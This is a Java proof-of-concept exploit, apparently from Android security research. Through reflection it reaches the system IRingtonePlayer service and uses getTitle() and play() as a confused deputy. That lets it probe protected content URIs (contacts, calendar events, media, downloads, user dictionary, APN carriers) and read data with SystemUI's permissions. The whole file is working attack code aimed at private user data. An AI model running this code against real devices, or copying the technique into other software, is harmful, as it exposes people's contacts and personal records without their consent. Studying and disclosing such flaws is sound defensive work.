import android.net.Uri;
import android.os.IBinder;
import java.lang.reflect.Method;

public class QuickTest2 {
    public static void main(String[] args) throws Exception {
        System.out.println("[*] V-18 Extended Test — Probing what Ringtone.getTitle() actually returns");
        System.out.println("[*] UID: " + android.os.Process.myUid());
        System.out.println();

        // Get IRingtonePlayer
        Class<?> smClass = Class.forName("android.os.ServiceManager");
        Method getService = smClass.getDeclaredMethod("getService", String.class);
        IBinder audioBinder = (IBinder) getService.invoke(null, "audio");
        Class<?> stubClass = Class.forName("android.media.IAudioService$Stub");
        Method asInterface = stubClass.getDeclaredMethod("asInterface", IBinder.class);
        Object audioService = asInterface.invoke(null, audioBinder);
        Method getRingtonePlayer = audioService.getClass().getMethod("getRingtonePlayer");
        Object player = getRingtonePlayer.invoke(audioService);
        if (player == null) { System.out.println("[-] No player"); return; }
        System.out.println("[+] Got IRingtonePlayer");

        Method getTitle = null;
        for (Method m : player.getClass().getMethods()) {
            if (m.getName().equals("getTitle")) { getTitle = m; break; }
        }

        // Ringtone.getTitle() internally queries:
        //   1. MediaStore.Audio.Media.EXTERNAL_CONTENT_URI for _display_name
        //   2. Falls back to cursor column "title"
        //   3. Falls back to URI last path segment
        //
        // For contacts, the right URI that returns actual names:
        String[][] testCases = {
            // Contacts — lookup URI returns display_name
            {"content://com.android.contacts/contacts/1/data", "Contact #1 data"},
            {"content://com.android.contacts/data/1", "Contact data row 1"},
            {"content://com.android.contacts/data/2", "Contact data row 2"},
            {"content://com.android.contacts/data/3", "Contact data row 3"},
            {"content://com.android.contacts/data/4", "Contact data row 4"},
            {"content://com.android.contacts/data/5", "Contact data row 5"},
            {"content://com.android.contacts/raw_contacts/1", "Raw contact 1"},

            // Phone lookup — specific contact info
            {"content://com.android.contacts/phone_lookup/1234567890", "Phone lookup"},

            // MediaStore — check real filenames
            {"content://media/external/audio/media", "Audio media (list)"},
            {"content://media/external/images/media", "Images media (list)"},
            {"content://media/external/video/media", "Video media (list)"},
            {"content://media/internal/audio/media/1", "Internal audio 1"},

            // Downloads
            {"content://media/external/downloads", "Downloads"},
            {"content://downloads/public_downloads/1", "Public download 1"},

            // Calendar
            {"content://com.android.calendar/events/1", "Calendar event 1"},
            {"content://com.android.calendar/calendars", "Calendars list"},

            // User dictionary
            {"content://user_dictionary/words", "User dictionary"},

            // Telephony
            {"content://telephony/carriers", "APN carriers"},
        };

        System.out.println();
        System.out.println("=== Extended URI Probing ===");
        System.out.println();

        for (String[] tc : testCases) {
            try {
                Uri uri = Uri.parse(tc[0]);
                String title = (String) getTitle.invoke(player, uri);
                if (title != null && !title.isEmpty()) {
                    System.out.println("[+] " + tc[1]);
                    System.out.println("    URI:    " + tc[0]);
                    System.out.println("    Result: \"" + title + "\"");
                } else {
                    System.out.println("[ ] " + tc[1] + " => (empty)");
                }
            } catch (Exception e) {
                String msg = e.getCause() != null ? e.getCause().getMessage() : e.getMessage();
                // Truncate long error messages
                if (msg != null && msg.length() > 100) msg = msg.substring(0, 100) + "...";
                System.out.println("[x] " + tc[1] + " => " + msg);
            }
        }

        // Also try play() to verify confused deputy file access
        System.out.println();
        System.out.println("=== Testing play() for confused deputy file read ===");

        Method play = null;
        for (Method m : player.getClass().getMethods()) {
            if (m.getName().equals("play") && m.getParameterTypes().length == 5) {
                play = m;
                break;
            }
        }

        if (play != null) {
            try {
                // Build minimal AudioAttributes via reflection
                Class<?> aaBuilderClass = Class.forName("android.media.AudioAttributes$Builder");
                Object builder = aaBuilderClass.getDeclaredConstructor().newInstance();
                Method buildMethod = aaBuilderClass.getMethod("build");
                Object aa = buildMethod.invoke(builder);

                IBinder token = new android.os.Binder();
                Uri contactPhotoUri = Uri.parse("content://com.android.contacts/contacts/1/photo");

                System.out.println("[*] Calling play() with contact photo URI...");
                System.out.println("    URI: " + contactPhotoUri);
                play.invoke(player, token, contactPhotoUri, aa, 0.0f, false);
                System.out.println("[+] play() succeeded — SystemUI opened the URI with its permissions");
                System.out.println("    (If this were a custom ContentProvider, it would receive");
                System.out.println("     openFile() call from SystemUI with READ_CONTACTS privilege)");

                // Stop
                Thread.sleep(500);
                Method stop = null;
                for (Method m : player.getClass().getMethods()) {
                    if (m.getName().equals("stop") && m.getParameterTypes().length == 1) {
                        stop = m; break;
                    }
                }
                if (stop != null) stop.invoke(player, token);
                System.out.println("[*] Stopped");
            } catch (Exception e) {
                String msg = e.getCause() != null ? e.getCause().getMessage() : e.getMessage();
                System.out.println("[x] play() error: " + msg);
                System.out.println("    (Error expected if URI doesn't point to audio data,");
                System.out.println("     but the ContentProvider openFile() was still called!)");
            }
        }

        System.out.println();
        System.out.println("=== Extended Test Complete ===");
    }
}
